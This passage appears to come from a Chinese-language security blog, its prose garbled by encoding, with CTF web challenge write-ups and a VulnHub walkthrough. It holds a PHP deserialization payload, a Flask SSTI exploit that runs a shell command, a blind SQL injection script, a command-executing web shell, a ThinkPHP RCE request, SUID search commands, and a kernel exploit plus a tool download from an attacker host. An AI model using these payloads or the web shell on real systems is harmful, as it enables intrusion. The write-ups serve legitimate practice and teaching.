<span class="token variable">$c</span><span class="token operator">=</span><span class="token keyword">new</span> <span class="token class-name">Crypto</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token variable">$s</span><span class="token operator">-></span><span class="token property">errMsg</span><span class="token operator">=</span><span class="token variable">$c</span><span class="token punctuation">;</span>
<span class="token variable">$c</span><span class="token operator">-></span><span class="token property">obj</span><span class="token operator">=</span><span class="token variable">$r</span><span class="token punctuation">;</span>
<span class="token variable">$r</span><span class="token operator">-></span><span class="token property">func</span><span class="token operator">=</span><span class="token variable">$p</span><span class="token punctuation">;</span>
<span class="token variable">$p</span><span class="token operator">-></span><span class="token property">obj</span><span class="token operator">=</span><span class="token variable">$w</span><span class="token punctuation">;</span>
<span class="token keyword">echo</span> <span class="token function">serialize</span><span class="token punctuation">(</span><span class="token keyword">array</span><span class="token punctuation">(</span><span class="token variable">$s</span><span class="token punctuation">,</span><span class="token variable">$s</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
<p>å¾—åˆ°ç»“æœ<br><code>a:2:&#123;i:0;O:5:&quot;Start&quot;:1:&#123;s:6:&quot;errMsg&quot;;O:6:&quot;Crypto&quot;:1:&#123;s:3:&quot;obj&quot;;O:7:&quot;Reverse&quot;:1:&#123;s:4:&quot;func&quot;;O:3:&quot;Pwn&quot;:1:&#123;s:3:&quot;obj&quot;;O:3:&quot;Web&quot;:2:&#123;s:4:&quot;func&quot;;s:6:&quot;system&quot;;s:3:&quot;var&quot;;s:2:&quot;ls&quot;;&#125;&#125;&#125;&#125;&#125;i:1;r:2;&#125;</code><br>è¿™é‡Œå°†<code>i:0</code>æ”¹ä¸º<code>i:1</code>å³å¯ç»•è¿‡throwæˆåŠŸè§¦å‘<code>__destruct()</code><br><code>a:2:&#123;i:1;O:5:&quot;Start&quot;:1:&#123;s:6:&quot;errMsg&quot;;O:6:&quot;Crypto&quot;:1:&#123;s:3:&quot;obj&quot;;O:7:&quot;Reverse&quot;:1:&#123;s:4:&quot;func&quot;;O:3:&quot;Pwn&quot;:1:&#123;s:3:&quot;obj&quot;;O:3:&quot;Web&quot;:2:&#123;s:4:&quot;func&quot;;s:6:&quot;system&quot;;s:3:&quot;var&quot;;s:2:&quot;ls&quot;;&#125;&#125;&#125;&#125;&#125;i:1;r:2;&#125;</code></p>
<p><img src="https://img-blog.csdnimg.cn/949cac6db39a4b47a7c3f37641e35358.png" alt="456"></p>
<h3 id="InjectMe"><a href="#InjectMe" class="headerlink" title="InjectMe"></a>InjectMe</h3><p>çŸ¥è¯†ç‚¹ï¼šSSTI<br><img src="https://img-blog.csdnimg.cn/433667ad644a4d51bb2825e80fa85c05.png" alt="123"><br>urlä¸ºï¼š<code>http://007b1ed3-c9a0-400b-bc74-007f54a2966c.node4.buuoj.cn:81/download?file=1.jpg</code><br>å¯ä»¥è¯•è¯•ä»»æ„æ–‡ä»¶ä¸‹è½½ï¼Œå‘ç°æˆåŠŸäº†ã€‚<br>ç”±äºdockeré‡Œç”¨çš„æ˜¯flaskï¼Œå¯ä»¥å°è¯•çœ‹çœ‹æºç ä½ç½®ï¼Œæœ€åå‘ç°åœ¨&#x2F;app&#x2F;app.py</p>
<pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">import</span> os
<span class="token keyword">import</span> re

<span class="token keyword">from</span> flask <span class="token keyword">import</span> Flask<span class="token punctuation">,</span> render_template<span class="token punctuation">,</span> request<span class="token punctuation">,</span> abort<span class="token punctuation">,</span> send_file<span class="token punctuation">,</span> session<span class="token punctuation">,</span> render_template_string
<span class="token keyword">from</span> config <span class="token keyword">import</span> secret_key

app <span class="token operator">=</span> Flask<span class="token punctuation">(</span>__name__<span class="token punctuation">)</span>
app<span class="token punctuation">.</span>secret_key <span class="token operator">=</span> secret_key


<span class="token decorator annotation punctuation">@app<span class="token punctuation">.</span>route</span><span class="token punctuation">(</span><span class="token string">'/'</span><span class="token punctuation">)</span>
<span class="token keyword">def</span> <span class="token function">hello_world</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>  <span class="token comment"># put application's code here</span>
    <span class="token keyword">return</span> render_template<span class="token punctuation">(</span><span class="token string">'index.html'</span><span class="token punctuation">)</span>


<span class="token decorator annotation punctuation">@app<span class="token punctuation">.</span>route</span><span class="token punctuation">(</span><span class="token string">"/cancanneed"</span><span class="token punctuation">,</span> methods<span class="token operator">=</span><span class="token punctuation">[</span><span class="token string">"GET"</span><span class="token punctuation">]</span><span class="token punctuation">)</span>
<span class="token keyword">def</span> <span class="token function">cancanneed</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
    all_filename <span class="token operator">=</span> os<span class="token punctuation">.</span>listdir<span class="token punctuation">(</span><span class="token string">'./static/img/'</span><span class="token punctuation">)</span>
    filename <span class="token operator">=</span> request<span class="token punctuation">.</span>args<span class="token punctuation">.</span>get<span class="token punctuation">(</span><span class="token string">'file'</span><span class="token punctuation">,</span> <span class="token string">''</span><span class="token punctuation">)</span>
    <span class="token keyword">if</span> filename<span class="token punctuation">:</span>
        <span class="token keyword">return</span> render_template<span class="token punctuation">(</span><span class="token string">'img.html'</span><span class="token punctuation">,</span> filename<span class="token operator">=</span>filename<span class="token punctuation">,</span> all_filename<span class="token operator">=</span>all_filename<span class="token punctuation">)</span>
    <span class="token keyword">else</span><span class="token punctuation">:</span>
        <span class="token keyword">return</span> <span class="token string-interpolation"><span class="token string">f"</span><span class="token interpolation"><span class="token punctuation">&#123;</span><span class="token builtin">str</span><span class="token punctuation">(</span>os<span class="token punctuation">.</span>listdir<span class="token punctuation">(</span><span class="token string">'./static/img/'</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">&#125;</span></span><span class="token string"> &lt;br> &lt;a href=\"/cancanneed?file=1.jpg\">/cancanneed?file=1.jpg&lt;/a>"</span></span>


<span class="token decorator annotation punctuation">@app<span class="token punctuation">.</span>route</span><span class="token punctuation">(</span><span class="token string">"/download"</span><span class="token punctuation">,</span> methods<span class="token operator">=</span><span class="token punctuation">[</span><span class="token string">"GET"</span><span class="token punctuation">]</span><span class="token punctuation">)</span>
<span class="token keyword">def</span> <span class="token function">download</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
    filename <span class="token operator">=</span> request<span class="token punctuation">.</span>args<span class="token punctuation">.</span>get<span class="token punctuation">(</span><span class="token string">'file'</span><span class="token punctuation">,</span> <span class="token string">''</span><span class="token punctuation">)</span>
    <span class="token keyword">if</span> filename<span class="token punctuation">:</span>
        filename <span class="token operator">=</span> filename<span class="token punctuation">.</span>replace<span class="token punctuation">(</span><span class="token string">'../'</span><span class="token punctuation">,</span> <span class="token string">''</span><span class="token punctuation">)</span>
        filename <span class="token operator">=</span> os<span class="token punctuation">.</span>path<span class="token punctuation">.</span>join<span class="token punctuation">(</span><span class="token string">'static/img/'</span><span class="token punctuation">,</span> filename<span class="token punctuation">)</span>
        <span class="token keyword">print</span><span class="token punctuation">(</span>filename<span class="token punctuation">)</span>
        <span class="token keyword">if</span> <span class="token punctuation">(</span>os<span class="token punctuation">.</span>path<span class="token punctuation">.</span>exists<span class="token punctuation">(</span>filename<span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token keyword">and</span> <span class="token punctuation">(</span><span class="token string">"start"</span> <span class="token keyword">not</span> <span class="token keyword">in</span> filename<span class="token punctuation">)</span><span class="token punctuation">:</span>
            <span class="token keyword">return</span> send_file<span class="token punctuation">(</span>filename<span class="token punctuation">)</span>
        <span class="token keyword">else</span><span class="token punctuation">:</span>
            abort<span class="token punctuation">(</span><span class="token number">500</span><span class="token punctuation">)</span>
    <span class="token keyword">else</span><span class="token punctuation">:</span>
        abort<span class="token punctuation">(</span><span class="token number">404</span><span class="token punctuation">)</span>


<span class="token decorator annotation punctuation">@app<span class="token punctuation">.</span>route</span><span class="token punctuation">(</span><span class="token string">'/backdoor'</span><span class="token punctuation">,</span> methods<span class="token operator">=</span><span class="token punctuation">[</span><span class="token string">"GET"</span><span class="token punctuation">]</span><span class="token punctuation">)</span>
<span class="token keyword">def</span> <span class="token function">backdoor</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
    <span class="token keyword">try</span><span class="token punctuation">:</span>
        <span class="token keyword">print</span><span class="token punctuation">(</span>session<span class="token punctuation">.</span>get<span class="token punctuation">(</span><span class="token string">"user"</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
        <span class="token keyword">if</span> session<span class="token punctuation">.</span>get<span class="token punctuation">(</span><span class="token string">"user"</span><span class="token punctuation">)</span> <span class="token keyword">is</span> <span class="token boolean">None</span><span class="token punctuation">:</span>
            session<span class="token punctuation">[</span><span class="token string">'user'</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token string">"guest"</span>
        name <span class="token operator">=</span> session<span class="token punctuation">.</span>get<span class="token punctuation">(</span><span class="token string">"user"</span><span class="token punctuation">)</span>
        <span class="token keyword">if</span> re<span class="token punctuation">.</span>findall<span class="token punctuation">(</span>
                <span class="token string">r'__|&#123;&#123;|class|base|init|mro|subclasses|builtins|globals|flag|os|system|popen|eval|:|\+|request|cat|tac|base64|nl|hex|\\u|\\x|\.'</span><span class="token punctuation">,</span>
                name<span class="token punctuation">)</span><span class="token punctuation">:</span>
            abort<span class="token punctuation">(</span><span class="token number">500</span><span class="token punctuation">)</span>
        <span class="token keyword">else</span><span class="token punctuation">:</span>
            <span class="token keyword">return</span> render_template_string<span class="token punctuation">(</span>
                <span class="token string">'ç«Ÿç„¶ç»™&lt;h1>%s&lt;/h1>ä½ æ‰¾åˆ°äº†æˆ‘çš„åé—¨ï¼Œä½ ä¸€å®šæ˜¯ç½‘ç»œå®‰å…¨å¤§èµ›å† å†›å§ï¼ğŸ˜ &lt;br> é‚£ä¹ˆ ç°åœ¨è½®åˆ°ä½ äº†!&lt;br> æœ€åç¥æ‚¨ç©å¾—æ„‰å¿«!ğŸ˜'</span> <span class="token operator">%</span> name<span class="token punctuation">)</span>
    <span class="token keyword">except</span> Exception<span class="token punctuation">:</span>
        abort<span class="token punctuation">(</span><span class="token number">500</span><span class="token punctuation">)</span>


<span class="token decorator annotation punctuation">@app<span class="token punctuation">.</span>errorhandler</span><span class="token punctuation">(</span><span class="token number">404</span><span class="token punctuation">)</span>
<span class="token keyword">def</span> <span class="token function">page_not_find</span><span class="token punctuation">(</span>e<span class="token punctuation">)</span><span class="token punctuation">:</span>
    <span class="token keyword">return</span> render_template<span class="token punctuation">(</span><span class="token string">'404.html'</span><span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token number">404</span>


<span class="token decorator annotation punctuation">@app<span class="token punctuation">.</span>errorhandler</span><span class="token punctuation">(</span><span class="token number">500</span><span class="token punctuation">)</span>
<span class="token keyword">def</span> <span class="token function">internal_server_error</span><span class="token punctuation">(</span>e<span class="token punctuation">)</span><span class="token punctuation">:</span>
    <span class="token keyword">return</span> render_template<span class="token punctuation">(</span><span class="token string">'500.html'</span><span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token number">500</span>


<span class="token keyword">if</span> __name__ <span class="token operator">==</span> <span class="token string">'__main__'</span><span class="token punctuation">:</span>
    app<span class="token punctuation">.</span>run<span class="token punctuation">(</span><span class="token string">'0.0.0.0'</span><span class="token punctuation">,</span> port<span class="token operator">=</span><span class="token number">8080</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
<p>å…¶ä¸­çœ‹åˆ°è¿™ä¸€ç‚¹ï¼š</p>
<pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">from</span> config <span class="token keyword">import</span> secret_key

app <span class="token operator">=</span> Flask<span class="token punctuation">(</span>__name__<span class="token punctuation">)</span>
app<span class="token punctuation">.</span>secret_key <span class="token operator">=</span> secret_key<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre>
<p>è¯´æ˜è¿˜å­˜åœ¨ä¸€ä¸ªkeyï¼Œè¿™ä¸ªæ—¶å€™æƒ³åˆ°äº†å¯èƒ½æ˜¯sessionä¼ªé€ ï¼Œä½†æ˜¯åé¢æ‰çŸ¥é“è‡ªå·±é”™äº†ã€‚<br>å¼€å§‹å¯»æ‰¾keyï¼šå°è¯•è¯»å–config.pyæ–‡ä»¶ï¼Œè¿˜çœŸå‘ç°keyäº†ã€‚<br>è®¿é—®&#x2F;backdoor<br><img src="https://img-blog.csdnimg.cn/9e10aa25386245fcab49d3ac50e42782.png" alt="789"><br>ç»“åˆæºç è¿™é‡Œguestæ˜¯æ³¨å…¥ç‚¹ã€‚<br>æœ€åçš„expï¼š</p>
<blockquote>
<p><code>python flask_session_cookie_manager3.py encode -s &quot;y0u_n3ver_k0nw_s3cret_key_1s_newst4r&quot; -t &quot;&#123;&#39;user&#39;:\&quot;&#123;% print(()['_''_cl''ass_''_']['_''_ba''se_''_']['_''_subcla''sses_''_']()[280]('paste /y0U3_f14g_1s_h3re',shell=True,stdout=-1)['communic''ate']()[0]['strip']())%&#125;\&quot;&#125;&quot;</code></p>
</blockquote>
<h3 id="midsql"><a href="#midsql" class="headerlink" title="midsql"></a>midsql</h3><p><img src="https://img-blog.csdnimg.cn/b2e48cac738542c2b9d600cbb190c40b.png" alt="456"><br>exp:</p>
<pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token comment">#Author: f0njl//è¿™ä¸ªæ˜¯å¤§ä½¬ï¼ï¼ï¼</span>
<span class="token keyword">import</span> requests
<span class="token keyword">import</span> datetime

url <span class="token operator">=</span> <span class="token string">"http://5e08a16e-94a2-4d92-8e7a-85d3c1cf93b0.node4.buuoj.cn:81/?id="</span>
flag <span class="token operator">=</span> <span class="token string">""</span>
<span class="token builtin">str</span> <span class="token operator">=</span> <span class="token string">"0123456789asdfghjklzxcvbnmqwertyuiop&#125;&#123;-_."</span>
<span class="token keyword">for</span> i <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token number">33</span><span class="token punctuation">,</span><span class="token number">150</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
    <span class="token keyword">for</span> j <span class="token keyword">in</span> <span class="token builtin">str</span><span class="token punctuation">:</span>
        <span class="token comment">#payload = "1/**/and/**/if(substr(database(),&#123;&#125;,1)/**/like/**/'&#123;&#125;',sleep(2),1)--".format(i,j)</span>
        <span class="token comment">#payload = "1/**/and/**/if(substr((select/**/group_concat(column_name)/**/from/**/information_schema.columns/**/where/**/table_schema/**/like/**/database()),&#123;&#125;,1)/**/like/**/'&#123;&#125;',sleep(3),1)--".format(i,j)</span>
        payload <span class="token operator">=</span> <span class="token string">"1/**/and/**/if(substr((select/**/group_concat(id,name,price)/**/from/**/items),&#123;&#125;,1)/**/like/**/'&#123;&#125;',sleep(5),1)--"</span><span class="token punctuation">.</span><span class="token builtin">format</span><span class="token punctuation">(</span>i<span class="token punctuation">,</span>j<span class="token punctuation">)</span>
        time1 <span class="token operator">=</span> datetime<span class="token punctuation">.</span>datetime<span class="token punctuation">.</span>now<span class="token punctuation">(</span><span class="token punctuation">)</span>
        r <span class="token operator">=</span> requests<span class="token punctuation">.</span>get<span class="token punctuation">(</span>url <span class="token operator">+</span> payload<span class="token punctuation">)</span>
        time2 <span class="token operator">=</span> datetime<span class="token punctuation">.</span>datetime<span class="token punctuation">.</span>now<span class="token punctuation">(</span><span class="token punctuation">)</span>
        sec <span class="token operator">=</span> <span class="token punctuation">(</span>time2 <span class="token operator">-</span> time1<span class="token punctuation">)</span><span class="token punctuation">.</span>seconds
        <span class="token keyword">if</span> sec <span class="token operator">></span> <span class="token number">4</span><span class="token punctuation">:</span>
            flag <span class="token operator">+=</span> j
            <span class="token keyword">print</span><span class="token punctuation">(</span>flag<span class="token punctuation">)</span>
            <span class="token keyword">break</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<h3 id="flask-disk"><a href="#flask-disk" class="headerlink" title="flask disk"></a>flask disk</h3><p>è¿™ä¸ªçœ‹äº†wpï¼Œæˆ‘æ˜¯çœŸçš„æ²¡æœ‰æƒ³åˆ°:cry:</p>
<p>æ•´ä½“æ€è·¯å°±æ˜¯å†ä¸Šä¼ ä¸€ä¸ªapp.pyæ–‡ä»¶å°†åŸæ¥çš„è¦†ç›–æ‰ï¼Œè€Œä¸”è‡ªå·±ä¸Šä¼ çš„app.pyæ–‡ä»¶å¯ä»¥è¿›è¡Œå‘½ä»¤æ‰§è¡Œ</p>
<p>ä¸Šä¼ çš„app.pyæ–‡ä»¶</p>
<pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token comment">#ç¼–å†™ä¸€ä¸ªèƒ½å¤Ÿæ‰§è¡Œç³»ç»Ÿå‘½ä»¤çš„app.pyæ–‡ä»¶</span>

<span class="token keyword">import</span> os
<span class="token keyword">from</span> flask <span class="token keyword">import</span> request<span class="token punctuation">,</span>Flask
app <span class="token operator">=</span> Flask<span class="token punctuation">(</span>__name__<span class="token punctuation">)</span>
<span class="token decorator annotation punctuation">@app<span class="token punctuation">.</span>route</span><span class="token punctuation">(</span><span class="token string">'/'</span><span class="token punctuation">)</span>
<span class="token keyword">def</span> <span class="token function">index</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
    <span class="token keyword">try</span><span class="token punctuation">:</span>
        cmd <span class="token operator">=</span> request<span class="token punctuation">.</span>args<span class="token punctuation">.</span>get<span class="token punctuation">(</span><span class="token string">'cmd'</span><span class="token punctuation">)</span>
        data<span class="token operator">=</span>os<span class="token punctuation">.</span>popen<span class="token punctuation">(</span>cmd<span class="token punctuation">)</span><span class="token punctuation">.</span>read<span class="token punctuation">(</span><span class="token punctuation">)</span>
        <span class="token keyword">return</span> data
    <span class="token keyword">except</span><span class="token punctuation">:</span>
        <span class="token keyword">pass</span>
    <span class="token keyword">return</span> <span class="token string">"1"</span>
<span class="token keyword">if</span> __name__ <span class="token operator">==</span> <span class="token string">'__main__'</span><span class="token punctuation">:</span>
    app<span class="token punctuation">.</span>run<span class="token punctuation">(</span>host<span class="token operator">=</span><span class="token string">'0.0.0.0'</span><span class="token punctuation">,</span>port<span class="token operator">=</span><span class="token number">8080</span><span class="token punctuation">,</span>debug<span class="token operator">=</span><span class="token boolean">True</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<p>åœ¨è®¿é—®ä¸»é¡µé¢å‘ç°é¡µé¢æ˜¾ç¤º1<br><img src="https://img-blog.csdnimg.cn/ba72b904153041518054f8b91dc9fa42.png" alt="1"></p>
<p>ç„¶åå‘½ä»¤æ‰§è¡Œæ‰¾åˆ°flagæ–‡ä»¶å³å¯<br><img src="https://img-blog.csdnimg.cn/08117b98aae246469e673400a37b8fd7.png" alt="4"></p>
<h2 id="week5-web"><a href="#week5-web" class="headerlink" title="week5-web"></a>week5-web</h2><h3 id="Final"><a href="#Final" class="headerlink" title="Final"></a>Final</h3><p>thinkphpç‰ˆæœ¬V5.0ï¼ŒæŸ¥æ‰¾ç›¸å…³æ¼æ´<br>å¯ä»¥ä½¿ç”¨thinkphpæ¼æ´æ£€æµ‹å·¥å…·æ£€æµ‹<br><img src="https://img-blog.csdnimg.cn/9c5d9c30762645d5bd5e2908a85aa5a9.png" alt="123"><br>å½“ç„¶ä¹Ÿå¯ä»¥è‡ªå·±æ‰¾payloadã€‚<br><code>Payload: http://a3b86432-64d4-4f0b-baf9-2ff5ed65a5aa.node4.buuoj.cn:81/?s=captcha&amp;test=-1  Post: _method=__construct&amp;filter[]=phpinfo&amp;method=get&amp;server[REQUEST_METHOD]=1</code><br>å‘ç°ç¦ç”¨äº†å‡½æ•°<br><img src="https://img-blog.csdnimg.cn/a61aa626bbbc41139d0549f5f6a31875.png" alt="78"><br>ä½¿ç”¨<code>execã€passthru</code>ä»£æ›¿ï¼Œç„¶åå†™å…¥ä¸€å¥è¯æœ¨é©¬ã€‚<br><img src="https://img-blog.csdnimg.cn/f990d9432a94456393f414f51e9683f0.png" alt="456"><br>æˆåŠŸå†™å…¥<br><img src="https://img-blog.csdnimg.cn/7db60203c64241acac20e5d7a58b229d.png" alt="123"><br>ä½†æ˜¯è¿˜è¦è¿›è¡Œææƒ<br><img src="https://img-blog.csdnimg.cn/937b271605e24fff8b6180ca5049e0a1.png" alt="789"><br>æŸ¥çœ‹å…·æœ‰SUIDæƒé™çš„å‘½ä»¤ï¼š</p>
<blockquote>
<p>find &#x2F; -user root -perm -4000 -print 2&gt;&#x2F;dev&#x2F;null<br>find &#x2F; -perm -u&#x3D;s -type f 2&gt;&#x2F;dev&#x2F;null<br>find &#x2F; -user root -perm -4000 -exec ls -ldb {} ;</p>
</blockquote>
<p>åé¢å€ŸåŠ©<a href="https://gtfobins.github.io/">GTFOBins</a>è¿›è¡Œææƒå§ï¼ï¼ï¼</p>
]]></content>
      <categories>
        <category>èµ›äº‹WP</category>
      </categories>
      <tags>
        <tag>ctf</tag>
      </tags>
  </entry>
  <entry>
    <title>Lord-Of-The-Root-1-0-1</title>
    <url>/2023/09/11/Lord-Of-The-Root-1-0-1/</url>
    <content><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><meta name="referrer" content="no-referrer"/>

<h2 id="å‰è¨€"><a href="#å‰è¨€" class="headerlink" title="å‰è¨€"></a>å‰è¨€</h2><p>1ã€é¶æœºä¸‹è½½åœ°å€ï¼š<a href="https://download.vulnhub.com/lordoftheroot/LordOfTheRoot_1.0.1.ova">https://download.vulnhub.com/lordoftheroot/LordOfTheRoot_1.0.1.ova</a> 2ã€æ¶‰åŠçŸ¥è¯†ç‚¹ï¼š &gt;1ã€ç«¯å£ç¢°æ’ &gt;2ã€å†…æ ¸ææƒï¼ˆUbuntu14.04ç‰ˆæœ¬ï¼‰ &gt;3ã€UDFææƒ</p>
<h2 id="é¶æœºçŸ¥è¯†ç‚¹è®°å½•"><a href="#é¶æœºçŸ¥è¯†ç‚¹è®°å½•" class="headerlink" title="é¶æœºçŸ¥è¯†ç‚¹è®°å½•"></a>é¶æœºçŸ¥è¯†ç‚¹è®°å½•</h2><p>ä½¿ç”¨nmapæ¢æµ‹ä¹‹åå‘ç°é¶æœºåªå¼€æ”¾äº†22ï¼ˆsshï¼‰ç«¯å£ï¼Ÿï¼Ÿä»€ä¹ˆç©æ„å„¿ã€‚ã€‚ã€‚ åœ¨å°è¯•sshç™»å½•æ—¶å‘ç°ä¸€éƒ¨åˆ†å†…å®¹ï¼š <img src="https://img-blog.csdnimg.cn/090fe71b8b45414dbf63b1f3f996bf28.png" alt="45"> çœ‹åˆ°äº†easy as 1ï¼Œ2ï¼Œ3ã€‚ ä»¥å‰ä¹Ÿæ²¡é‡åˆ°è¿‡ï¼Œå†æŸ¥çœ‹åˆ«äººçš„æ‰“é¶è®°å½•ä¹‹åå‘ç°åŸæ¥æ˜¯å…³äº<strong>ç«¯å£ç¢°æ’ï¼ˆPort Knockingï¼‰æŠ€æœ¯</strong>çš„çŸ¥è¯†ç‚¹ã€‚</p>
<blockquote>
<p>ç«¯å£ç¢°æ’æ˜¯ä¸€ç§é€šè¿‡åœ¨ä¸€ç»„é¢„å…ˆæŒ‡å®šçš„å…³é—­ç«¯å£ä¸Šäº§ç”Ÿè¿æ¥è¯·æ±‚ï¼Œä»å¤–éƒ¨æ‰“å¼€é˜²ç«å¢™ä¸Šçš„ç«¯å£çš„æ–¹æ³•ã€‚å¦‚æœæ”¶åˆ°æ­£ç¡®çš„è¿æ¥è¯·æ±‚åºåˆ—ï¼Œé˜²ç«å¢™è§„åˆ™å°±ä¼šè¢«åŠ¨æ€æ›´æ”¹ï¼Œä»è€Œå…è®¸è¿æ¥è¯·æ±‚çš„ä¸»æœºé€šè¿‡ç‰¹å®šç«¯å£è¿›è¡Œè¿æ¥ã€‚å¦‚æœä¸æ˜¯æŒ‰ç…§ç‰¹å®šçš„ç«¯å£åºåˆ—è¿›è¡Œè¯·æ±‚ï¼Œé‚£ä¹ˆå—ä¿æŠ¤çš„ç«¯å£å°±ä¼šå…³é—­ã€‚</p>
</blockquote>
<p>é¶æœºè¿™ä¸ªæ„æ€åº”è¯¥å°±æ˜¯è¦æŒ‰ç…§ç«¯å£1ã€2ã€3çš„åºåˆ—è¿›è¡Œè¿æ¥å°è¯•ã€‚ä¹‹åæ‰“å¼€å—ä¿æŠ¤çš„ç«¯å£ã€‚ <strong>ç«¯å£ç¢°æ’æ–¹æ³•</strong></p>
<ul>
<li>1 knockå‘½ä»¤</li>
</ul>
<blockquote>
<p>konck 192.168.206.144 1 2 3 -v</p>
</blockquote>
<ul>
<li>2 nmapå‘½ä»¤</li>
</ul>
<blockquote>
<p>æŒ‰æ¬¡åºè¿›è¡ŒæŒ‡å®šç«¯å£æ‰«æå³å¯</p>
</blockquote>
<p><img src="https://img-blog.csdnimg.cn/7130abec22004654add004cd8a88ed15.png" alt="2"></p>
<p>ä¹‹åå†ä½¿ç”¨nmapæ¢æµ‹ã€‚ åé¢åœ¨æ‰¾åˆ°ç™»å½•é¡µé¢ä¹‹åå°è¯•è¿›è¡Œsqlæ³¨å…¥ã€‚ æ™®é€šçš„æ–¹å¼è¿›è¡ŒSQLmapæ³¨å…¥æ‰«ææ²¡æ‰¾åˆ°ï¼Œä½¿ç”¨sqllmapè¿›è¡Œé’ˆå¯¹è¡¨å•çš„æ³¨å…¥:</p>
<blockquote>
<p>sqlmap -o -u <a href="http://192.168.206.144:1337/978345210/index.php">http://192.168.206.144:1337/978345210/index.php</a> â€“forms â€“dbs</p>
</blockquote>
<p>åœ¨æ‹¿åˆ°è´¦å·å¯†ç ä¹‹åä½¿ç”¨sshç™»å½•é¶æœº</p>
<blockquote>
<p>ssh <a href="mailto:&#115;&#109;&#x65;&#x61;&#103;&#x6f;&#108;&#64;&#49;&#57;&#x32;&#46;&#x31;&#x36;&#x38;&#46;&#50;&#x30;&#54;&#46;&#49;&#52;&#52;">&#115;&#109;&#x65;&#x61;&#103;&#x6f;&#108;&#64;&#49;&#57;&#x32;&#46;&#x31;&#x36;&#x38;&#46;&#50;&#x30;&#54;&#46;&#49;&#52;&#52;</a> MyPreciousR00t</p>
</blockquote>
<p>ç™»å½•ä¹‹åå½“ç„¶è¦å¼€å§‹æ”¶é›†ä¿¡æ¯è¿›è¡Œææƒäº†ï¼ŒæŸ¥çœ‹ç³»ç»Ÿç‰ˆæœ¬</p>
<blockquote>
<p>uname -a Linux LordOfTheRoot 3.19.0-25-generic #26~14.04.1-Ubuntu SMP Fri Jul 24 21:18:00 UTC 2015 i686 i686 i686 GNU&#x2F;Linux</p>
</blockquote>
<p>ä¹Ÿå¯ä»¥ç»™é¶æœºä¸Šä¼ ä¸€ä¸ªä¿¡æ¯æ”¶é›†æ–‡ä»¶ æœ¬æœºä½¿ç”¨pythonå¼€å¯ä¸€ä¸ªhttpæœåŠ¡</p>
<blockquote>
<p>python -m http.server</p>
</blockquote>
<p>é¶æœºä¸‹è½½æ–‡ä»¶</p>
<blockquote>
<p>wget <a href="http://192.168.206.1:8000/linux-exploit-suggester.sh">http://192.168.206.1:8000/linux-exploit-suggester.sh</a> chmod 777 linux-exploit-suggester.sh .&#x2F;linux-exploit-suggester.sh</p>
</blockquote>
<p>æ”¶é›†ä¸€æ³¢ä¹‹åå‘ç°å¯ä»¥ä½¿ç”¨è„ç‰›ææƒï¼Œä½†æ˜¯è¯•äº†å‡ æ¬¡éƒ½æŠŠé¶æœºæåäº†ï¼Œæ¢ä¸€ç§æ–¹æ³•å§ã€‚ æˆ‘ä½¿ç”¨çš„å¤šçš„ä¿¡æ¯æ”¶é›†å·¥å…·æ˜¯<strong>linpeas.sh</strong>ã€‚ å¥½äº†å…ˆä½¿ç”¨å†…æ ¸ææƒæœç´¢Ubuntu14.04ç‰ˆæœ¬ææƒæ¼æ´ æ‰¾åˆ°ä¸€ä¸ª<a href="https://www.exploit-db.com/exploits/39166">CVE-2015-8660</a></p>
<p>ä¸‹è½½ä¹‹åæ‰§è¡Œä»¥ä¸‹å‘½ä»¤å°±è¡Œ</p>
<blockquote>
<p>gcc 39166.c -o dayu chmod 777 czy .&#x2F;dayu</p>
